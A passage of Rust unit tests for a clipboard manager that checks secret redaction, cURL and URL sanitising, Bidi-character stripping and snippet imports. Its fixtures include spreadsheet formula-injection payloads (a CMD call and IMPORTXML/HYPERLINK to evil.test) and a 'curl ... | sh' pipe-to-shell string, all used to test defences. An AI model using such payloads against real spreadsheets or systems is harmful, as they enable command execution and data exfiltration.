            format!("curl -H 'Authorization: Bearer {groq_key}' http://10.24.8.19:8080/failover?standby=10.24.8.20&phone=13812345678")
        );

        wipe_privacy_twins();
        assert_eq!(inspect_restorable_privacy_twins(ai_reply), None);

        // 2. 验证 OWASP CWE-1236 电子表格公式注入护盾（拦截危险公式且保留合法负数与电话）
        assert_eq!(
            crate::security::sanitize_spreadsheet_cell("=CMD|' /C calc'!A0"),
            "'=CMD|' /C calc'!A0"
        );
        let risky_md = "| 字段 | 值 |\n| :--- | :--- |\n| 注入 | =IMPORTXML(\"https://evil.test\",\"//a\") |\n| 外带 | +HYPERLINK(\"https://evil.test\") |\n| 亏损 | -128.50 |\n| 号码 | +86-13800138000 |";
        let tbl = analyze_table_bridge(risky_md);
        let tsv = &tbl
            .iter()
            .find(|a| a.id == "tbl-md-to-excel")
            .unwrap()
            .result_text;
        assert!(tsv.contains("'=IMPORTXML(\"https://evil.test\",\"//a\")"));
        assert!(tsv.contains("'+HYPERLINK(\"https://evil.test\")"));
        assert!(tsv.contains("\t-128.50"));
        assert!(!tsv.contains("'-128.50"));
        assert!(tsv.contains("\t+86-13800138000"));

        // 3. 验证未收藏敏感凭据手动删除时跳过内存撤销栈（零残留）
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter12-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let sec_id = store.insert_or_promote(ClipItem::new_text(groq_key, None));
        store.delete_by_id(&sec_id);
        assert!(!store.has_active_undo(crate::model::now_unix_secs()));
        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_smart_field_extractor_queue_split_import_poison_guard_and_kube_jdbc_secrets() {
        use crate::intelligence::{
            extract_unique_emails, extract_unique_ipv4s, parse_shipping_contact,
        };
        use crate::security::{classify_sensitive_text, SensitiveSecretKind};

        // 1. 验证收件名片自然混排提纯与一键拆入 FIFO 顺序连填队列
        let wechat_order = "麻烦发顺丰：林晓明 139-2888-6699 广东省深圳市南山区科苑南路3009号中国储能大厦18楼（顺丰到付谢谢） https://admin.internal/order?id=88";
        let shipping = parse_shipping_contact(wechat_order).unwrap();
        assert_eq!(shipping.recipient_name.as_deref(), Some("林晓明"));
        assert_eq!(shipping.clean_phone, "13928886699");
        assert_eq!(
            shipping.clean_address,
            "广东省深圳市南山区科苑南路3009号中国储能大厦18楼"
        );
        assert!(!shipping.clean_card_text().contains("admin.internal"));

        let order_item = ClipItem::new_text(wechat_order.to_string(), None);
        assert!(order_item.matches_query("@地址"));
        assert!(order_item.matches_query("@手机"));

        let messy_mail =
            "抄送：Alice@corp.com, bob@corp.com；退信 alice@corp.com，节点 10.0.1.8 -> 192.168.1.9 -> 10.0.1.8";
        assert_eq!(
            extract_unique_emails(messy_mail),
            vec!["Alice@corp.com".to_string(), "bob@corp.com".to_string()]
        );
        assert_eq!(
            extract_unique_ipv4s(messy_mail),
            vec!["10.0.1.8".to_string(), "192.168.1.9".to_string()]
        );
        let mail_item = ClipItem::new_text(messy_mail.to_string(), None);
        assert!(mail_item.matches_query("@邮箱"));
        assert!(mail_item.matches_query("@ip"));

        // 2. 验证拆入连填队列与外部常用语包导入自动剥离 Trojan Bidi 毒字符
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter13-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let q_len = store.enqueue_contact_fields_for_sequential_paste(&shipping.queue_fields());
        assert_eq!(q_len, 3);
        assert_eq!(
            store.dequeue_next_item().unwrap().text.as_deref(),
            Some("林晓明")
        );
        assert_eq!(
            store.dequeue_next_item().unwrap().text.as_deref(),
            Some("13928886699")
        );
        assert_eq!(
            store.dequeue_next_item().unwrap().text.as_deref(),
            Some("广东省深圳市南山区科苑南路3009号中国储能大厦18楼")
        );

        let poisoned_raycast =
            "[{\"name\":\"Deploy\\u202ecek\",\"text\":\"kubectl get pods \\u202eevil\"}]";
        let (merged, _) = crate::archive::merge_archive_data_with_hint(
            poisoned_raycast.as_bytes(),
            &[],
            &store.images_dir,
            Some("json"),
        )
        .unwrap();
        assert_eq!(merged.len(), 1);
        assert!(!merged[0].text.as_deref().unwrap().contains('\u{202e}'));
        assert!(!merged[0]
            .custom_alias
            .as_deref()
            .unwrap()
            .contains('\u{202e}'));

        // 3. 验证 PuTTY 私钥、Kubernetes `client-key-data` 与 JDBC 连接串识别脱敏
        let kube_yaml = "  client-key-data: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ==";
        let jdbc_url = format!(
            "{}{}",
            "jdbc:mysql://db.prod.local:3306/app?user=admin&password=", "UltraSecretDbPass99"
        );
        let putty_key =
            "PuTTY-User-Key-File-3: ssh-ed25519\nPrivate-Lines: 1\nabcd\nPrivate-MAC: 0011223344";
        assert_eq!(
            classify_sensitive_text(kube_yaml),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert_eq!(
            classify_sensitive_text(putty_key),
            Some(SensitiveSecretKind::PrivateKey)
        );
        assert_eq!(
            classify_sensitive_text(&jdbc_url),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        assert!(!redact_secrets(&jdbc_url).contains("UltraSecretDbPass99"));
        assert!(redact_secrets(kube_yaml).contains("***KUBE_KEY_REDACTED***"));

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_presigned_url_public_share_clean_markdown_alfred_import_and_pinned_safe_append() {
        use crate::engines::{analyze_text_actions, sanitize_url_for_public_share};
        use crate::security::{
            classify_sensitive_text, parse_external_competitor_data, SensitiveSecretKind,
        };

        // 1. 验证云对象存储预签名 URL 敏感识别与外发「去鉴权净链」（剥离 Basic Auth + 预签名令牌 + utm 追踪尾巴）
        let fake_sig = format!("{}{}", "9f8e7d6c", "5b4a3210fedcba9876543210");
        let presigned = format!(
            "https://user:pass99@docs.example.com/report/q4?id=42&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=demo&X-Amz-Signature={fake_sig}&utm_source=feishu#summary"
        );
        assert_eq!(
            classify_sensitive_text(&presigned),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        assert!(!redact_secrets(&presigned).contains(&fake_sig));
        assert_eq!(
            sanitize_url_for_public_share(&presigned).as_deref(),
            Some("https://docs.example.com/report/q4?id=42#summary")
        );
        assert!(sanitize_url_for_public_share(
            "https://docs.example.com/report/q4?id=42&utm_source=feishu"
        )
        .is_none());

        let actions = analyze_text_actions(&presigned, false);
        assert!(actions.iter().any(|a| a.id == "sanitize-auth-url"));

        // 2. 验证 Alfred JSON、TextExpander JSON 与 Obsidian/Notion Markdown 常用语笔记迁入
        let alfred_json = r#"{"alfredsnippet":{"snippet":"git status -sb","uid":"u1","name":"Git 简明状态","keyword":";gs"}}"#.as_bytes();
        let (alfred_items, alfred_fmt) =
            parse_external_competitor_data(alfred_json, Some("json")).unwrap();
        assert_eq!(alfred_fmt, "Alfred 常用语");
        assert_eq!(alfred_items[0].alias.as_deref(), Some("Git 简明状态"));
        assert_eq!(alfred_items[0].text, "git status -sb");

        let te_json = r#"{"snippetPlists":[{"abbreviation":";addr","label":"公司收件地址","plainText":"深圳市南山区科技园 88 号"}]}"#.as_bytes();
        let (te_items, te_fmt) = parse_external_competitor_data(te_json, Some("json")).unwrap();
        assert_eq!(te_fmt, "TextExpander 常用语");
        assert_eq!(te_items[0].alias.as_deref(), Some("公司收件地址"));

        let obsidian_md = "---\ntags: [snippets]\n---\n# 研发常用语\n\n## 开票抬头\n星辰智造科技有限公司\n\n### `Docker 日志排障`\n```bash\ndocker compose logs -f --tail=100 app\n```\n";
        let (md_items, md_fmt) =
            parse_external_competitor_data(obsidian_md.as_bytes(), Some("md")).unwrap();
        assert_eq!(md_fmt, "Markdown 常用语笔记");
        assert_eq!(md_items.len(), 2);
        assert_eq!(md_items[0].alias.as_deref(), Some("开票抬头"));
        assert_eq!(md_items[1].alias.as_deref(), Some("Docker 日志排障"));
        assert_eq!(md_items[1].text, "docker compose logs -f --tail=100 app");

        // 3. 验证跨处续接复制绝不污染已锁定的置顶收藏常用语，且自动连根遗忘孤儿旧段哈希指纹
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter14-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let mut pinned_item =
            ClipItem::new_text("严禁被改写的收藏常用语".to_string(), Some("Notes".into()));
        pinned_item.is_pinned = true;
        let pinned_id = pinned_item.id.clone();
        store.insert_or_promote(pinned_item);

        let seg1 = ClipItem::new_text("第一段摘录".to_string(), Some("Browser".into()));
        let old_seg_hash = seg1.content_hash.clone();
        store.insert_or_promote(seg1);
        store.record_paste_usage(&old_seg_hash, Some("ChatGPT"));
        assert!(store.reuse_count(&old_seg_hash) >= 1);

        let appended = store.append_to_latest_text("第二段补充", "\n").unwrap();
        assert_eq!(appended, "第一段摘录\n第二段补充");
        let still_intact = store.items.iter().find(|i| i.id == pinned_id).unwrap();
        assert_eq!(still_intact.text.as_deref(), Some("严禁被改写的收藏常用语"));
        assert_eq!(store.reuse_count(&old_seg_hash), 0);

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_curl_safe_repro_sanitizer_jsonc_strict_cleaner_and_inline_curl_cred_veil() {
        use crate::engines::analyze_text_actions;
        use crate::security::{
            classify_sensitive_text, clean_jsonc_to_strict_json, sanitize_curl_for_repro,
            SensitiveSecretKind,
        };

        // 1. 验证 Chrome `Copy as cURL` 剥除浏览器噪音头并替换 Cookie / Authorization 为安全占位符
        let fake_jwt = format!(
            "{}{}{}",
            "eyJhbGciOiJIUzI1NiJ9.",
            "eyJzdWIiOiJ1c2VyOTkifQ.",
            "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        );
        let dirty_curl = format!(
            "curl 'https://api.example.com/v1/orders?page=1&utm_source=chrome' \\\n  -H 'sec-ch-ua: \"Chromium\";v=\"128\"' \\\n  -H 'sec-fetch-site: same-origin' \\\n  -H 'user-agent: Mozilla/5.0' \\\n  -H 'accept: application/json' \\\n  -H 'authorization: Bearer {fake_jwt}' \\\n  -b 'sid=real_session_secret_8899' \\\n  --compressed"
        );
        let (clean_curl, red_cnt, noise_cnt) = sanitize_curl_for_repro(&dirty_curl).unwrap();
        assert!(red_cnt >= 2);
        assert!(noise_cnt >= 3);
        assert!(!clean_curl.contains(&fake_jwt));
        assert!(!clean_curl.contains("real_session_secret_8899"));
        assert!(!clean_curl.contains("sec-ch-ua"));
        assert!(clean_curl.contains("Bearer $AUTH_TOKEN"));
        assert!(clean_curl.contains("$REDACTED_COOKIE"));
        assert!(clean_curl.contains("https://api.example.com/v1/orders?page=1"));

        let curl_actions = analyze_text_actions(&dirty_curl, false);
        assert!(curl_actions.iter().any(|a| a.id == "curl-safe-repro"));

        let basic_curl = format!(
            "{}{}",
            "curl -u admin:", "ProdPass#2026 https://corp.local/ping"
        );
        assert_eq!(
            classify_sensitive_text(&basic_curl),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        assert!(!redact_secrets(&basic_curl).contains("ProdPass#2026"));

        // 2. 验证带注释与尾随逗号的 JSONC 精准净化为标准合法 JSON（保护字符串内部 `https://` 与 `/*`）
        let raw_jsonc = "// 网关配置\n{\n  \"endpoint\": \"https://api.example.com/v1/*keep*/\", // 行尾注释\n  /* 块注释 */\n  \"timeoutMs\": 3000,\n  \"features\": [\"auth\", \"retry\",],\n}";
        let strict_json = clean_jsonc_to_strict_json(raw_jsonc).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&strict_json).unwrap();
        assert_eq!(
            parsed["endpoint"].as_str(),
            Some("https://api.example.com/v1/*keep*/")
        );
        assert_eq!(parsed["timeoutMs"].as_i64(), Some(3000));
        assert_eq!(parsed["features"].as_array().unwrap().len(), 2);
        assert!(clean_jsonc_to_strict_json(r#"{"ok": true}"#).is_none());
    }

    #[test]
    fn test_escape_decoder_poison_guard_line_dedup_and_archive_ocr_bidi_sanitize() {
        use crate::archive::{export_pinned_archive_data, merge_archive_data};
        use crate::engines::analyze_text_actions;
        use crate::security::{decode_escaped_text, deduplicate_list_lines};

        // 1. 验证 Unicode `\uXXXX`（含暗藏 `\u202e` Bidi 毒字符自动剥离）、URL `%XX` 与 HTML 实体解码
        let uni_raw = r"errmsg: \u8ba2\u5355\u652f\u4ed8\u5931\u8d25\u202eevil";
        let (dec_uni, _, _) = decode_escaped_text(uni_raw).unwrap();
        assert!(dec_uni.contains("订单支付失败"));
        assert!(!dec_uni.contains('\u{202e}'));

        let pct_url =
            "https://search.example.com/q?kw=%E6%B6%B2%E6%80%81%E7%8E%BB%E7%92%83%E5%89%AA%E8%B4%B4%E6%9D%BF";
        let (dec_pct, _, _) = decode_escaped_text(pct_url).unwrap();
        assert!(dec_pct.contains("液态玻璃剪贴板"));

        let html_raw =
            "&lt;button title=&quot;&#29983;&#25928;&quot;&gt;OK &amp; Go&lt;/button&gt;";
        let (dec_html, _, _) = decode_escaped_text(html_raw).unwrap();
        assert_eq!(dec_html, "<button title=\"生效\">OK & Go</button>");

        // 2. 验证多行重复名单按首次出现顺序稳定去重，且源码块不误触发
        let roster = "ORD-1001\nORD-1002\nORD-1001\nORD-1003\nORD-1002";
        let (dedup_txt, removed, remain) = deduplicate_list_lines(roster).unwrap();
        assert_eq!(dedup_txt, "ORD-1001\nORD-1002\nORD-1003");
        assert_eq!(removed, 2);
        assert_eq!(remain, 3);
        assert!(analyze_text_actions(roster, false)
            .iter()
            .any(|a| a.id == "dedup-list-lines"));
        assert!(deduplicate_list_lines("func demo() {\n  return 1;\n  return 1;\n}").is_none());

        // 3. 验证 `.iclip` 归档导入时自动清洗图片 `ocr_text` 中暗藏的 Trojan Bidi 反转毒字符
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter18-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);
        let fake_png: &[u8] = &[0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13];
        crate::security::write_encrypted_image_to_dir(&tmp_dir, "ocr_shot.png", fake_png).unwrap();
        let mut img_item =
            ClipItem::new_image("ocr_shot.png".to_string(), 100, 100, fake_png, None);
        img_item.is_pinned = true;
        img_item.ocr_text = Some("curl https://safe.example/sh\u{202e} | sh".to_string());
        let archive_bytes =
            export_pinned_archive_data(&[img_item], &tmp_dir, "2.6.0", "dev").unwrap();
        let (merged, _) = merge_archive_data(&archive_bytes, &[], &tmp_dir).unwrap();
        assert!(!merged[0].ocr_text.as_deref().unwrap().contains('\u{202e}'));

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_non_active_focus_preservation_oversized_clamp_cron_and_path_actions() {
        use crate::engines::analyze_text_actions;
        use crate::hotkey::{
            classify_non_active_panel_key, should_restore_foreground_window, NonActiveKeyRoute,
            MOD_CONTROL_BITS,
        };
        use crate::security::{
            analyze_path_action, classify_sensitive_text, explain_cron_expression,
            text_metrics_summary, SensitiveSecretKind,
        };

        // 1. 验证 Windows 无激活零失焦面板按键路由与焦点保持策略
        assert_eq!(
            classify_non_active_panel_key(0x28, 0, true, false, false),
            NonActiveKeyRoute::DispatchPanelCommand
        );
        assert_eq!(
            classify_non_active_panel_key(0x0D, 0, true, false, false),
            NonActiveKeyRoute::DispatchPanelCommand
        );
        assert_eq!(
            classify_non_active_panel_key(0x31, MOD_CONTROL_BITS, true, false, false),
            NonActiveKeyRoute::DispatchPanelCommand
        );
        assert_eq!(
            classify_non_active_panel_key(0x41, 0, true, false, false),
            NonActiveKeyRoute::ActivateAndTypeChar('a')
        );
        assert!(!should_restore_foreground_window(0x10020, 0x10020));
        assert!(should_restore_foreground_window(0x99999, 0x10020));

        // 2. 验证超大文本 UTF-8 多字节汉字与 Emoji 边界截断零 panic
        let clamped = ClipItem::clamp_oversized_text("微信搜索🚀测试文本".to_string(), 15);
        assert!(clamped.len() <= 15);
        assert_eq!(clamped, "微信搜索");

        // 3. 验证新型密钥识别、速览 Token 标尺、Cron 表达式直译与跨平台路径动作
        let fake_or = format!(
            "{}{}",
            "sk-or-v1-", "abcdef0123456789abcdef0123456789abcdef0123456789"
        );
        assert_eq!(
            classify_sensitive_text(&fake_or),
            Some(SensitiveSecretKind::ApiKey)
        );
        let fake_dbx = format!("{}{}", "dapi", "0123456789abcdef0123456789abcdef");
        assert_eq!(
            classify_sensitive_text(&fake_dbx),
            Some(SensitiveSecretKind::ApiKey)
        );

        let metrics = text_metrics_summary("你好世界\nHello World");
        assert!(metrics.contains("2行") && metrics.contains("tok"));

        let (cron_short, cron_comment) = explain_cron_expression("*/15 9-18 * * 1-5").unwrap();
        assert!(cron_short.contains("工作日") && cron_comment.starts_with("# "));
        assert!(explain_cron_expression("1 2 3 4 5").is_none());

        let (pid, _, pres, _) =
            analyze_path_action(r"C:\Users\dev\my project\config.json").unwrap();
        assert_eq!(pid, "path-win-to-slash");
        assert_eq!(pres, "C:/Users/dev/my project/config.json");

        let actions = analyze_text_actions("/Users/dev/My Secret Folder/a'b.txt", false);
        assert!(actions.iter().any(|a| a.id == "path-shell-quote"));
    }

    #[test]
    fn test_redis_empty_user_uri_trim_memory_forget_ctrl_w_and_strip_markdown() {
        use crate::engines::{analyze_document_typography, analyze_text_actions, redact_secrets};
        use crate::hotkey::{classify_non_active_panel_key, NonActiveKeyRoute, MOD_CONTROL_BITS};
        use crate::security::{
            classify_sensitive_text, inspect_restorable_privacy_twins, mask_with_privacy_twins,
            wipe_privacy_twins, SensitiveSecretKind,
        };
        use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};

        // 1. 验证无用户名 Redis 连接串识别、掩码与双向 AI 替身回填
        let redis_uri = "redis://:prod_cache_pw_2026@10.0.8.12:6379/0";
        assert_eq!(
            classify_sensitive_text(redis_uri),
            Some(SensitiveSecretKind::ConnectionSecret)
        );
        let redacted = redact_secrets(redis_uri);
        assert!(!redacted.contains("prod_cache_pw_2026") && redacted.contains("***REDACTED***"));

        wipe_privacy_twins();
        let (masked, cnt) = mask_with_privacy_twins(&format!("ERR: {redis_uri}")).unwrap();
        assert!(cnt >= 1 && !masked.contains("prod_cache_pw_2026"));
        let (restored, _) = inspect_restorable_privacy_twins(&masked).unwrap();
        assert!(restored.contains("prod_cache_pw_2026"));
        wipe_privacy_twins();

        // 2. 验证 Ctrl+W / Ctrl+V 无激活面板按键路由（防穿透关掉宿主浏览器标签页）
        assert_eq!(
            classify_non_active_panel_key(0x57, MOD_CONTROL_BITS, true, false, false),
            NonActiveKeyRoute::DispatchPanelCommand
        );
        assert_eq!(
            classify_non_active_panel_key(0x56, MOD_CONTROL_BITS, true, false, false),
            NonActiveKeyRoute::DispatchPanelCommand
        );

        // 3. 验证容量淘汰自动遗忘被挤出记录的行为哈希 + 孤儿图片清扫
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip-iter21-test-{}-{}",
            std::process::id(),
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);
        let mut store = ClipboardStore::new(tmp_dir.clone());
        store.config.max_history_count = 10;
        let old_item = ClipItem::new_text("old-evicted-secret-0".to_string(), None);
        let old_hash = old_item.content_hash.clone();
        store.items.push(old_item);
        store.record_paste_usage(&old_hash, Some("WeChat"));
        assert_eq!(store.reuse_count(&old_hash), 1);
        for i in 1..=12 {
            let mut newer = ClipItem::new_text(format!("newer-entry-{i}"), None);
            newer.created_unix_secs += i as u64;
            store.items.insert(0, newer);
        }
        store.trim_history_if_needed();
        assert_eq!(store.reuse_count(&old_hash), 0);

        fs::write(store.images_dir.join("orphan_ghost.png"), b"ghost").unwrap();
        store.sweep_orphaned_image_files();
        assert!(!store.images_dir.join("orphan_ghost.png").exists());
        let _ = fs::remove_dir_all(&tmp_dir);

        // 4. 验证 Base64 解码防 Bidi 投毒与 AI 回复「去 Markdown 纯文本」
        let b64_poison = BASE64.encode("echo safe\u{202e}evil_payload".as_bytes());
        let b64_actions = analyze_text_actions(&b64_poison, false);
        if let Some(act) = b64_actions.iter().find(|a| a.id == "base64-decode") {
            assert!(!act.result_text.contains('\u{202e}') && act.is_security);
        }

        let md = "### 一、发布结论\n- [x] **核心优化**：完成 `零失焦` 重构\n- [ ] 官网 [点击访问](https://app.webfooo.com/iClip)\n算式：2 * 3 * 4 = 24";
        let doc_acts = analyze_document_typography(md);
        let strip_act = doc_acts
            .iter()
            .find(|a| a.id == "doc-strip-markdown")
            .unwrap();
        assert!(!strip_act.result_text.contains("###") && !strip_act.result_text.contains("**"));
        assert!(strip_act
            .result_text
            .contains("☑ 核心优化：完成 零失焦 重构"));
        assert!(strip_act
            .result_text
            .contains("☐ 官网 点击访问 (https://app.webfooo.com/iClip)"));
        assert!(strip_act.result_text.contains("2 * 3 * 4 = 24"));
    }
}
